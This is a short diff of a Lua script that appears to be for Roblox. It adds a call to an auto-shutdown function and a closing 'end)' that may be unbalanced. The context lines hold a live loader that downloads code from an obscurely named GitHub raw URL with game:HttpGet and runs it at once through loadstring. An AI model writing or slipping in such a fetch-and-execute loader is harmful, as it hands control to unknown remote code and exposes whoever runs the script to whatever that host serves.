@@ -154,6 +154,9 @@ function autoShutdownIfNotAlone()
     end
 end
 
+autoShutdownIfNotAlone()
+end)
+
 task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/bwixauxnn3366265894447/xcvd4ccss566532/refs/heads/main/TEST"))();end)
 
 task.spawn(function()
